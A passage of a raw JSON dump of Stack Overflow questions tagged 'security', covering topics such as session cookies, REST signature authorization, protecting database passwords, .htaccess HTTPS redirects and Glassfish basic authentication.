and security, without first requiring a user to verify their email address during registration.</p>\n"},{"tags":["security","cookies","login"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":80,"score":2,"question_id":12758277,"title":"user  login security - local cookie vs sessions","body":"<p>I've read a few answers here about this topic, and people say that using sessions is more secure that using only cookie, but I don't see how can that be true.</p>\n\n<p>Let's say you're using sessions, and on the client's computer only the session ID is stored. If a hacker gains access to the client's computer and steals the session ID cookie, he practically gains access to the client's account on my site, right?</p>\n\n<p>Now if you're using only local cookies, and store like a hashed portion of the the clients password + combined with a salt that only your server knows, a hacker can still gain access to his account by stealing his cookie from his PC.</p>\n\n<p>So in the end there's no difference between the two methods, right? Or am I missing something ?</p>\n"},{"tags":["ruby","web-services","security","soa","http-authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12759813,"title":"SOA - Signature Authorization Service - how to make the web interface to access user data","body":"<p>I've designed a REST Authorization Service that works pretty much like the <a href=\"http://docs.amazonwebservices.com/AmazonS3/latest/dev/RESTAuthentication.html\" rel=\"nofollow\">Amazon S3 REST Authentication</a> and it's secure enough to work on HTTP (without requiring the overhead to make all intercomunications run on SSL).</p>\n\n<p>It's secure enough because the signature changes at each request and is subject to expiration. So it's safe against MITM (that cannot edit anything otherwise the endpoint won't be able to regenerate the same signature) and replay attacks (because of the timestamp usage).</p>\n\n<p>That's good for all clients, that knowing the private key, now can perform requested actions on their own data generating a unique signature containing the request data.</p>\n\n<p>The authorization service doesn't generate any token (so it cannot be subject to MITM attacks) and it is only called internally, meaning that a client performs a request directly to the right endpoint to perform certain operations, instead of requesting a token to give that service... then the endpoint receiving that request makes a query to the authorization service asking \"hey, is this requested legit?\" if so the authorization service returns \"200 OK\" and the service performs requested operations, otherwise it returns \"401 Unauthorized\".</p>\n\n<p>What I need now is to allow a special client, a web user interface, to make users login using email/password and use the webUI itself to obtain/edit their data. The webUI will run on HTTPS. Please, consider that creating a new account generates always both user/pwd login and pubkey/privatekey, but actually we're only using pubkey/privatekey. User and pwd are stored inside a db that will be used only by the WebUI, while the pubkey/privatekey is stored inside the Authorization Service (that uses another DB).</p>\n\n<p>Of course to work with customer data I need some way to make the webUI act as it is a client written for the logged user (that has a pubkey/privatekey associated pair to generate the signature). I'm not sure what's the safest way to do this so I'm going to explain several solutions I tought about.</p>\n\n<p>The 1st solution I tought is give the web interface its own pubkey/privatekey, making it a real client, and then edit the authorization service to recognize it and allow it to send the publickey (that can be retrieved by the authorization service) using a header like \"X-Forwarded-For\") and always trust the webUI authority. But I'm scared that somehow I'm missing something that could lead to attacks to exploit this authority to obtain the data you are not authorized for.</p>\n\n<p>The second solution would be, once logged in successfully, transfer both pubkey/privatekey from the Authorization Service to the WebUI that then stores it inside the session, and each time an action is performed it uses that data to generate a valid signature. But I don't really like to pass those data over network (also because this communication should be at least over SSL to avoid the privatekey to be sniffed), and I don't really like to have the private key stored inside a session backend.</p>\n\n<p>The last solution I tought about is rethink the authorization service and also allow authentication by user and password (that will be no more stored inside the webUI but togheter with pubkey/privatekey inside the Authorization Service). This would always require a SSL connection because the webui has to communicate email and password, but if logged correctly it could only store those data inside the session created. Another side effect would be that other services could be implemented to use user/pwd instead of using the signature method, that over HTTP would mean expose data to the world.</p>\n\n<p>I want the strongest and more logical solution, that makes the webUI act as a client because the entire architecture is thought to work on a client-server basis. I'm also available to accept other suggestions not listed here.</p>\n\n<p>Please, tell me if you need to know more to help me.</p>\n\n<p>Thank you (if you've read the whole post :-P)</p>\n"},{"tags":["sql-server","security","sql-server-ce","database-connection"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12758067,"title":"How can I protect the password for an encrypted SQL Server Compact database?","body":"<p>I have found a few resources that tell me causing a SQL Compact DB to be encrypted is as simple as specifying a password in the connection string. But, I am not comfortable leaving that password in my web.config file. I know I can supply a connection string for a DbContext dynamically, at runtime, but even there, I'm still including a plain text password in the connection string. How can I minimise points in my code where this password is vulnerable?</p>\n"},{"tags":["security","file","encryption"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12758922,"title":"How to prevent access of users to read and extract my binary files","body":"<p>I have set of binary data files among one of my applications and for security issues I should encrypt and decrypt files for every use. This is quite well but the process is killing. I use Blowfish to perform ciphering and it's really slow in both functions. I can understand that if someone wants to extract my data from the binary files, he/she should have a recognition about my file pattern but I'm afraid that would be nothing hard to guess.</p>\n\n<p>Is there any way to lock access for users to read binary files with use of encryption or other things?</p>\n"},{"tags":[".net","security","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12353889,"title":"How to prevent anonymous file uploads from HTML Forms","body":"<p>There is a major security breach in one of our company's websites. The website is built on C#, ASP.Net and IIS 7. There are some hackers who are able to upload files from the login form from the website's home page. There are no other forms on the website and only the index page is visible to the users. </p>\n\n<p>When I check the server logs, there is no anonymous access from Remote Desktop or FTP. So I think the hackers are uploading files from the login form only. We have setup the firewall which restricts user access to certain countries, but when I see server log, still people from those restricted countries are able to access that page and these files are coming from those countries only.</p>\n\n<p>The server which we are using is a dedicated server. The customer support could not provide sufficient help in fixing this issue.</p>\n\n<p>Can someone please throw a light over whats happening here and how I can prevent it.</p>\n"},{"tags":["mysql","security","postgresql","ssh","database-connection"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":156,"score":1,"question_id":10161566,"title":"How to easily and safely connect to postgres or mysql remotely?","body":"<p>I would like to know how can you connect to postgresql in these conditions:</p>\n\n<ul>\n<li>allow you to access them from any location (do IP filtering)</li>\n<li>safe connection (no risk on having your password captured)</li>\n<li>easy to setup, preferably having to configure only the server for that.</li>\n</ul>\n\n<p>I know that the recommended approach is to used SSH port forwarding, but this requires you to start the port forwarding before trying to connect to these databases. </p>\n\n<p>What is the easiest method to acquire a good enough security without having to do complex setup on the client. </p>\n\n<p>Is there a way to auto enable the port forwarding stuff on demand?</p>\n"},{"tags":["javascript","html","security","http-headers"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":12756936,"title":"Security Concerns with window.location.href","body":"<p>After reading a Wikipedia article about URL redirection I'm wondering if <code>window.location.href=\"page.php\"</code> is the best option for a web page redirect. The wikipedia article suggests that</p>\n\n<blockquote>\n  <p>However, HTTP headers or the refresh meta tag may be preferred for security reasons and because JavaScript will not be executed by some browsers and many web crawlers.</p>\n</blockquote>\n\n<p>Is there anything I have to worry about? What could be some alternatives using javascipt if there is a problem? The window.location.href is activated when the user logs in.</p>\n"}]}
{"total":17772,"page":10,"pagesize":100,"questions":[{"tags":["flash","security","xss","cross-domain"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":673,"score":1,"question_id":1922373,"title":"What policy is enforced by an \"empty\" crossdomain.xml?","body":"<p>What policy would be enforced by the following crossdomain.xml that contains no allow statements.</p>\n\n<pre><code>&lt;cross-domain-policy&gt;\n  &lt;site-control permitted-cross-domain-policies=\"all\"/&gt;\n&lt;/cross-domain-policy&gt;\n</code></pre>\n\n<p>Does this implicitly deny or accept everything?</p>\n"},{"tags":["html","security","web-applications","user-interface","user-experience"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":678,"score":3,"question_id":5601234,"title":"To captcha or not to captcha","body":"<p>I would like to know what do you think about adding captcha mechanisms to registration forms?</p>\n\n<p>I notice that many sites don't use captcha mechanisms in their registration forms(examples: <a href=\"http://djdesignerlab.com/2010/04/14/25-cool-sign-up-and-login-form-designs/\" rel=\"nofollow\">http://djdesignerlab.com/2010/04/14/25-cool-sign-up-and-login-form-designs/</a>). </p>\n\n<p>I would like to open this topic to see what people thinks.</p>\n\n<p>I always thought that we should make our forms as secured as possible, but from another point of view there are many users out there that don't really have to much patience to fill a captcha at a registration page. </p>\n\n<p>-Do you think adding this mechanism to a registration page can drastically drop the amount of registered users at long term?</p>\n\n<p>-How dangerous can it be not including this mechanism at a registration page?</p>\n"},{"tags":["sql-server-2008","security"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":42,"score":0,"question_id":12753777,"title":"What hashing algorithm does SQL Server 2008 R2 use for the sa password?","body":"<p>I think it's SHA1, but I'm unsure on how to tell.</p>\n"},{"tags":["spring","security","spring-mvc","spring-security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12745416,"title":"Spring Security annotations not consistent?","body":"<p>I noticed that on my code, I can successfully annotate methods on services classes (@Service) with both @Secured(\"ROLE_ADMIN\") and @RolesAllowed(\"ROLE_ADMIN\"). It works. Though, when I move the same annotations to the controller classes (@Controller) only @Secured gets activated whereas @RolesAllowed is ignored. I configured my root applicationContext with</p>\n\n<pre><code>&lt;security:global-method-security \n          jsr250-annotations=\"enabled\" \n          secured-annotations=\"enabled\"/&gt;\n</code></pre>\n\n<p>Why isn't @RollesAllowed applicable to controller classes while @Secured is?</p>\n"},{"tags":["security",".htaccess","ssl","https"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":12751326,"title":"How to specify Multiple Secure Webpages with .htaccess RewriteCond","body":"<p>I have 3 pages that I want to make secure on my website using .htaccess</p>\n\n<pre><code>-login.php\n-checkout.php\n-account.php\n</code></pre>\n\n<p>I know how to make just one work page at a time using .htaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} /login.php\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [L]\n</code></pre>\n\n<p>I and trying to figure out how to include the other 2 specific pages to make them also secure and used the expression below but it didn't work</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} /login.php\nRewriteCond %{REQUEST_URI} /checkout.php\nRewriteCond %{REQUEST_URI} /account.php\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [L]\n</code></pre>\n\n<p>Can someone help me the right expression that will work with multiple pages?</p>\n\n<p>The second part of the code is that, if https is already on and a user move to a page that Is not any of the pages i specified about, I want that it should get back to http. how should I write the statement for it to redirect back to http if its not any of the pages above? </p>\n\n<p>I have my statement like this but its not working </p>\n\n<pre><code>RewriteCond %{HTTPS} on \nRewriteRule !(checkout|login|account|payment)\\.php http://%{HTTP_HOST}%{REQUEST_URI} [L,R]\n</code></pre>\n\n<p>Any thoughts? </p>\n"},{"tags":["security","validation"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":116,"score":0,"question_id":4967855,"title":"Is a one letter username insecure?","body":"<p>We are building a secure application and were discussing the validation needed for a username.\nIt is clear that for a password that complexity rules must be established, yet for a username is it also true? \nIs it insecure to accept a one letter username? What are the security issues?</p>\n"},{"tags":["c#","security","ssl","asp.net-web-api","client-certificates"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":146,"score":5,"question_id":12308434,"title":"ASP.NET WebApi - How do I \"allow\", but not \"require\" client certificates?","body":"<p>In IIS, I can \"ignore\", \"allow\" and \"require\" client certificates.</p>\n\n<p>In ASP.NET WebAPI (version 4.0 that just launched a little while back), I seem to have the ability to only \"ignore\" or \"require\".</p>\n\n<p>By default, client certificates are ignored... so this statement always yields null:</p>\n\n<pre><code>var cert = actionContext.Request.GetClientCertificate();\n</code></pre>\n\n<p>But, if I set this flag on my config:</p>\n\n<pre><code>config.ClientCredentialType = HttpClientCredentialType.Certificate;\n</code></pre>\n\n<p>Then I get the client cert... but, I no longer have the ability to allow anonymous access.</p>\n\n<p>My anonymous client now gets a <code>403</code> error: \"The remote server returned an error: (403) Forbidden.\"</p>\n\n<p>Can I do a sort of \"allow\" like in IIS?</p>\n"},{"tags":["android","security","android-apk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12750200,"title":"how can we find the urls where an android apk sends request?","body":"<p>I want to check whether an app is an spam app or not. So for that i need to find out the urls where it is sending requests. Any way to find out ?</p>\n\n<p>I had decompiled the app using apktool.</p>\n\n<p>thanks in advance.</p>\n"},{"tags":["java","linux","security","glassfish","basic-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1789,"score":0,"question_id":5912577,"title":"How to implement basic authentication with Glassfish?","body":"<p>I'm tried this configuration but it didn't work for me. \n<a href=\"http://stackoverflow.com/questions/3892870/basic-authentication-in-glassfish\">Basic Authentication in Glassfish</a> \nI also tried this guide \n<a href=\"http://maksim.sorokin.dk/it/2010/10/13/basic-authentication-in-glassfish-3/\" rel=\"nofollow\">http://maksim.sorokin.dk/it/2010/10/13/basic-authentication-in-glassfish-3/</a> but I couldn't get user-pass asking with it too.</p>\n\n<p>These are steps I've taken:<br>\n1. Login as admin to Admin interface.<br>\n2. Go to Security->Realms->File<br>\n3. Add a group name (Users) to Assign Groups field.<br>\n4. Open manage users at the top of the page.<br>\n5. Click New and add an user (testuser) and give a password.<br>\n6. Add (Users) to Group List.<br>\n7. put this lines to web.xml</p>\n\n\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n        &lt;web-resource-name&gt;Secure Application&lt;/web-resource-name&gt;\n        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n        &lt;http-method&gt;GET&lt;/http-method&gt;\n        &lt;http-method&gt;POST&lt;/http-method&gt;\n    &lt;/web-resource-collection&gt;\n\n    &lt;auth-constraint&gt;\n        &lt;role-name&gt;User&lt;/role-name&gt;\n    &lt;/auth-constraint&gt;\n  &lt;/security-constraint&gt;\n\n  &lt;login-config&gt;\n    &lt;auth-method&gt;BASIC&lt;/auth-method&gt;\n    &lt;realm-name&gt;file&lt;/realm-name&gt;\n  &lt;/login-config&gt;\n\n  &lt;security-role&gt;\n    &lt;role-name&gt;User&lt;/role-name&gt;\n  &lt;/security-role&gt;\n</code></pre>\n\n<p>8. and put this lines to sun-web.xml</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;sun-web-app error-url=\"\"&gt;\n  &lt;security-role-mapping&gt;\n    &lt;role-name&gt;User&lt;/role-name&gt;\n    &lt;group-name&gt;Users&lt;/group-name&gt;\n  &lt;/security-role-mapping&gt;\n&lt;/sun-web-app&gt;\n</code></pre>\n\n<p>9. After all I enabled Configurations->server-config->Security->Security Manager </p>\n\n<p>My configuration is Glassfish 3.1, sun java6 jdk, Debian lenny and a simple \"Hello World\" page for testing.</p>\n\n<p>What is missing here?</p>\n\n<p>UPDATE:</p>\n\n<p>I figured out it needs xml headers. After I've added them it started to work. My final configuration is below:</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;web-app version=\"3.0\" xmlns=\"http://java.sun.com/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\"&gt;\n&lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n        &lt;web-resource-name&gt;Secure Application&lt;/web-resource-name&gt;\n        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n        &lt;http-method&gt;GET&lt;/http-method&gt;\n        &lt;http-method&gt;POST&lt;/http-method&gt;\n    &lt;/web-resource-collection&gt;\n\n    &lt;auth-constraint&gt;\n        &lt;role-name&gt;Users&lt;/role-name&gt;\n    &lt;/auth-constraint&gt;\n&lt;/security-constraint&gt;\n\n  &lt;login-config&gt;\n    &lt;auth-method&gt;BASIC&lt;/auth-method&gt;\n    &lt;realm-name&gt;file&lt;/realm-name&gt;\n  &lt;/login-config&gt;\n\n  &lt;security-role&gt;\n    &lt;role-name&gt;Users&lt;/role-name&gt;\n  &lt;/security-role&gt;\n&lt;/web-app&gt;\n</code></pre>\n\n<p>and </p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE sun-web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Application Server 9.0 Servlet 2.5//EN\" \"http://www.sun.com/software/appserver/dtds/sun-web-app_2_5-0.dtd\"&gt;\n&lt;sun-web-app error-url=\"\"&gt;\n  &lt;security-role-mapping&gt;\n    &lt;role-name&gt;Users&lt;/role-name&gt;\n    &lt;group-name&gt;Users&lt;/group-name&gt;\n  &lt;/security-role-mapping&gt;\n&lt;/sun-web-app&gt;\n</code></pre>\n"},{"tags":["php","security","api","ssl","payment-gateway"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12732991,"title":"Transferring information securely across domains","body":"<p>HI guys have a bit of a logic question. I have a client that does event registration on sites A. B. and C. and they would like to start taking payments for the registrations. Now it would be a bit outlandish to create a payment platform on each site so I'm thinking of handling all the payments on an external source say, site D. now, what i'd need to do is create some sort of API that will receive payment data and handle it accordingly (I.E. process, reject, return messages etc.). My biggest concern is A. the security of this and B. really differentiating between clients (site A. B. and C.) and the possibility to vastly expand in the future. </p>\n\n<p>Is just transferring this data from an SSL secured site to another good enough? Should I be passing variables along with it? Thanks guys. </p>\n"},{"tags":["javascript","security","browser","cross-browser","xpcom"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2797,"score":3,"question_id":3658604,"title":"How to sign script or webpage requiring UniversalXPConnect privilege","body":"<p>I have a website which uses some functionality implemented in the Firefox extension, which I developed. JavaScript script on one of my webpages requires UniversalXPConnect privilege for communicating with XPCOM component implemented in my Firefox extension.</p>\n\n<p>By default, when my script tries to enable this privilege for accessing XPCOM component:</p>\n\n<p>netscape.security.PrivilegeManager.enablePrivilege(\"UniversalXPConnect\");</p>\n\n<p>... the following error occurs:</p>\n\n<p>Error: A script from \"http://example.com\" was denied UniversalXPConnect privileges.</p>\n\n<p>To enable this privilege currently users need to manually edit \"signed.applets.codebase_principal_support\" setting in \"about:config\" Firefox page.</p>\n\n<p>From this page: <a href=\"http://www.mozilla.org/projects/security/components/signed-scripts.html\" rel=\"nofollow\">http://www.mozilla.org/projects/security/components/signed-scripts.html</a> I learned that it is possible to explicitly sign my webpage containing script which requires this privilege. After I sign my script users will not need to manually edit above mentioned setting.</p>\n\n<p>Website is hosted on Linux platform under Drupal CMS.</p>\n\n<p>I would very much appreciate if you could give me detailed step-by-step instructions on how do I sign my script (what tools should I download, how to create certificate, etc.), such that after following your instructions editing about:config setting will not be necessary.</p>\n"},{"tags":["oracle","security","websphere","audit"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12606026,"title":"Capturing End User detail in an Oracle DB via Connection Pool in Websphere","body":"<p>I am currently working on an auditing piece where I need to know the end user name in the Oracle database in the background.</p>\n\n<p>The application uses Oracle authentication to grant access, and to handle permissions on features in the application.  It also (correctly) handles access to underlyinig data, ensuring the end user credentials persist into the data layer.</p>\n\n<p>When I try to audit the application (using Oracle auditing) I only get the connection pool user ID and the Websphere server name.</p>\n\n<p>I have searched and found suggestions to use Reauthentication (which doesn't log the correct user ID until the connection pool is fully used), WAS.clientinfo (which plain ol' doesn't pass the end user credentials to the DB) and have found reference to Guardium (which does the job, but is hideously expensive.)</p>\n\n<p>How can I pass end user information to the data layer?  I don't mind if this comes down to a configuration change, or a 3rd party product; as long as it works we can assess it.</p>\n"},{"tags":["objective-c","ios","security"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":12735989,"title":"Sending password to server","body":"<p>I am asking myself. What is the best way to send personal information from your iOS device to the server. </p>\n\n<p>At this moment I encrypt the password in the app ( sha1 salt password pepper ) then I send post data using from iOS to the server. </p>\n\n<p>What is the best way to protect the user and secure for any MITM attacks. Is my way secure enough?</p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>I added the SSL certificate. To make sure the user only has to login once I store a key generated when the user registered. I fetch them when the user logins for the first time. In oombination with the username and user id. Is this a good way? Only jailbroken users can read it and have risk.</p>\n"},{"tags":["c++","security","passwords","sql-server-ce"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12734705,"title":"Password solution for local database, passed between client and server","body":"<p>I have been working on a project that uses an sqlce database that is sent between the client, that needs to work off line, and a server that stores information database, the database is password protected. </p>\n\n<p>The hard part is, we have a business requirement that the users don't have to update to the latest version before reporting the information in the sqlce database and may even be a few generations behind with the latest version of the client and a possible updated password that the server needs to access the reported information in the database.</p>\n\n<p>Our current solution is to have the same static password, in the source code, on the client and the server and keeping them the same for backward compatibility.</p>\n\n<p><strong>My question is about a secure way to sync the password between the client and the server and keeping backward compatibility for older databases or being able to get some parameter from the database to see what password should match.</strong></p>\n\n<p>We use sql ce 3.1 and C++ at moment. solutions to the same problem in other technologies (SQLight? C#? Java?) are welcome since I think the problem can be applied on other projects.</p>\n\n<p>I hope my problem is clear and that there is a lot of answers out there, if there is something I need to clarify just ask me!</p>\n"},{"tags":["c#","asp.net","security","com+","dll"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":929,"score":2,"question_id":2361442,"title":"Programmatically add user role to COM+ component (C#)","body":"<p>I wish to know the way to add ASP.NET (\"Machine_Name\"\\IIS_IUSRS) to user role in COM+ component programmatically using C#. So whenever my COM+ component is being installed, ASP.NET user is created under Role.</p>\n"},{"tags":["security","haskell","type-safety","language-extension"],"answer_count":1,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":109,"score":7,"question_id":12735274,"title":"Breaking Data.Set integrity without GeneralizedNewtypeDeriving","body":"<p>The code below uses an unsafe <code>GeneralizedNewtypeDeriving</code> extension to break <code>Data.Set</code> by inserting different elements with different <code>Ord</code> instances:</p>\n\n<pre><code>{-# LANGUAGE GeneralizedNewtypeDeriving #-}\nimport Data.Set\nimport System.Random\n\nclass AlaInt i where\n  fromIntSet :: Set Integer -&gt; Set i\n  toIntSet :: Set i -&gt; Set Integer\ninstance AlaInt Integer where\n  fromIntSet = id\n  toIntSet = id\nnewtype I = I Integer deriving (Eq, Show, AlaInt)\ninstance Ord I where compare (I n1) (I n2) = compare n2 n1 -- sic!  \n\ninsert' :: Integer -&gt; Set Integer -&gt; Set Integer\ninsert' n s = toIntSet $ insert (I n) $ fromIntSet s\n\nrandomInput = take 5000 $ zip (randomRs (0,9) gen) (randoms gen) where\n    gen = mkStdGen 911\n\ncreateSet = Prelude.foldr f empty where\n    f (e,True) = insert e\n    f (e,False) = insert' e\n\nmain = print $ toAscList $ createSet randomInput\n</code></pre>\n\n<p>The code prints <code>[1,3,5,7,8,6,9,6,4,2,0,9]</code>. Note that the list is unordered and has <code>9</code> twice.</p>\n\n<p>Is it possible to perform this dictionary swapping attack using other extensions, e.g. <code>ConstraintKinds</code>? If yes, can <code>Data.Set</code> be redesigned to be resilient to such attacks?</p>\n"},{"tags":["security","passwords","enterprise"],"answer_count":12,"favorite_count":6,"up_vote_count":18,"down_vote_count":0,"view_count":12172,"score":18,"question_id":185262,"title":"How does your company do \"Enterprise\" Password Management?","body":"<p>We've talked about <b>personal</b> password management <a href=\"http://stackoverflow.com/questions/11362/what-is-your-favorite-password-storage-tool\">here</a> but how do you guys manage your passwords at a company wide level?</p>\n"},{"tags":["silverlight","security","webclient"],"answer_count":0,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":264,"score":3,"question_id":6627417,"title":"Security rules for subclassing transparent type with safe-critical constructor in Silverlight","body":"<p>In the Silverlight (v4.0) security model, <a href=\"http://blogs.msdn.com/b/shawnfa/archive/2007/05/11/silverlight-security-iii-inheritance.aspx\" rel=\"nofollow\">Shawn Farkas says</a> of deriving from types:</p>\n\n<blockquote>\n  <p>[...] we see that\n  application types may only derive from\n  other application types or transparent\n  platform types. (*)</p>\n</blockquote>\n\n<p>The * part of this is:</p>\n\n<blockquote>\n  <p>(*) This true in 99.9% case.  There is another rule about the visibility of the default constructor of a class (which we'll get into next week when we dig deeper into the security model), which also requires that the base class' default constructor (if it has one), must be transparent as well.  Practically speaking, you're not generally going to find interesting transparent types in the platform which do not also have transparent default constructors, so this rule doesn't normally come into play.</p>\n</blockquote>\n\n<p>There is, however, one such interesting transparent type which does not have a transparent default constructor - the WebClient class. There's also a good reason to want to subclass it - to override GetWebRequest to provide support for cookies.</p>\n\n<p>As a test, I've tried the following both with and without the constructor attribute...</p>\n\n<pre><code>public class MyWebClient : WebClient\n{\n    [SecuritySafeCritical] // matches the attribute on the base class ctor\n    public MyWebClient() { }\n}\n</code></pre>\n\n<p>...but get the following error either way:</p>\n\n<blockquote>\n  <p>Inheritance security rules violated while overriding member: 'MyWebClient..ctor()'. Security accessibility of the overriding method must match the security accessibility of the method being overriden.</p>\n</blockquote>\n\n<p>It looks to me like this is the 0.1% case that he mentions. Unfortunately, as far as I can tell, the next posts never did expand on what the rule would be here. Thus I have two questions:</p>\n\n<ol>\n<li>Does anybody know what this 0.1% rule is?</li>\n<li>Given 1, is it possible to derive from WebClient in Silverlight 4?</li>\n</ol>\n"},{"tags":["security","authentication","iis","internet"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12741040,"title":"IIS 7 secure windows authentication over the internet","body":"<p>I would like to deploy my great new ASP.Net app to my internet facing web server. I would like to use windows authenticaion over the internet, so that I.E. automatically prompts for windows login credentials. I want to make sure it is adequately secure.</p>\n\n<p>Some parameters around this are:</p>\n\n<ul>\n<li>I do not wish to implement SSL at this stage.</li>\n<li>We only have one server to authenticate to.\nI've read a lot about man in the middle attacks redirecting authentication information to a third party server, but in my case there is only one server - the one they are logging on to.</li>\n<li>I've been reading about IIS Windows Authentication Extended Protection, but I'm still uncertain of it's benefits</li>\n</ul>\n\n<p>So basically if I enable IIS Windows Authentication Extended Protection, and I can be certain no one gets phished, can I be pretty certain that this is going to be secure?</p>\n\n<p>Our server regularly suffers attacks - I think a few mistakes in the early days have got it on to an 'easy target' list.</p>\n"},{"tags":["wordpress","apache","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":11,"score":-3,"question_id":12741249,"title":"How to Correct Server Access Control","body":"<p>I could anyone here please explain to me how to create new user roles with this tut. </p>\n\n<p><a href=\"http://blog.sucuri.net/2012/07/wordpress-and-server-hardening-taking-security-to-another-level.html\" rel=\"nofollow\">http://blog.sucuri.net/2012/07/wordpress-and-server-hardening-taking-security-to-another-level.html</a> </p>\n\n<p>I'm just starting to learn how to use my first DS. Thanks.</p>\n"},{"tags":["security","cookies","jboss","seam","jsessionid"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":12740893,"title":"Jboss Seam JSESSIONID Cookie-Settings","body":"<p>I wanted to know, how I can override the jsessionid-cookie setting such as httpoly, secure and so on.\nI didn't find any setting or other easy possibility to set these things.\nCould it be something in the <code>web.xml</code> under session-config or can I add the settings via an servlet filter? </p>\n\n<p>What would you suggest.</p>\n"},{"tags":["security","ssl","certificate","openssl"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":103,"score":4,"question_id":6156227,"title":"Does the certificate a SSL connection/state \"points\" to change if I load a new certificate in OpenSSL?","body":"<p>I am building an application that will enable users to connect to the same server. Rather than the application/device using its own certificate/private key, it is important to ensure that each user has their own certificate/private key to use for encryption. </p>\n\n<p>Now I know, from the OpenSSL website documents, that their internal certificate store of OpenSSL can hold one certificate/key pair for the RSA cipher. My question is this:</p>\n\n<p>Presume I have a SSL struct named <strong>ssl1</strong> that I created from my SSL_CTX where I didn't set the certificate/key to use in the SSL_CTX (thus not inheriting the certificate/key). I then go on to set the certificate/key for <strong>ssl1</strong> that is associated with some user. Then suppose I have another SSL struct named <strong>ssl2</strong> created from the same SSL_CTX. I then go on to set the certificate/key for <strong>ssl2</strong> that is associated with a different user than the first one. </p>\n\n<p>If at this point I call the SSL_connect() API on <strong>ssl1</strong> will it use the certificate/key I set for <strong>ssl2</strong>? I ask since the store says it only holds one cert/key pair and I loaded the cert/key for <strong>ssl2</strong> last, thus I presume it would overwrite the one I loaded first for <strong>ssl1</strong>.</p>\n\n<p>Thanks for reading my post. I appreciate any help/wisdom/pointers you can provide.</p>\n"},{"tags":["php","security","ip-address","session-variables"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":34,"score":-1,"question_id":12740625,"title":"Grabbing an IP Address without needing to turn on Register Globals","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1437771/how-can-i-get-the-clients-ip-address-in-a-php-webservice\">How can I get the client&#39;s IP address in a PHP webservice?</a>  </p>\n</blockquote>\n\n\n\n<p>I'm wanting to grab the IP Address from the user but I don't want to turn register globals on in my php.ini file. Is there a way to work around this and still grab the ip address?</p>\n"},{"tags":["android","security","application","key","code-signing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12733726,"title":"Implications of 2 entities sharing an android signing key","body":"<p>I'm thinking about buying an existing android app from another developer. He has signed other apps not included in the sale with the same signing key as those included in the sale. What if any are the implications of sharing or duplicating the key and us both having a copy so we can update our owned apps? My main concern is can he update my newly purchased app without my permission or access to my developer account or vice 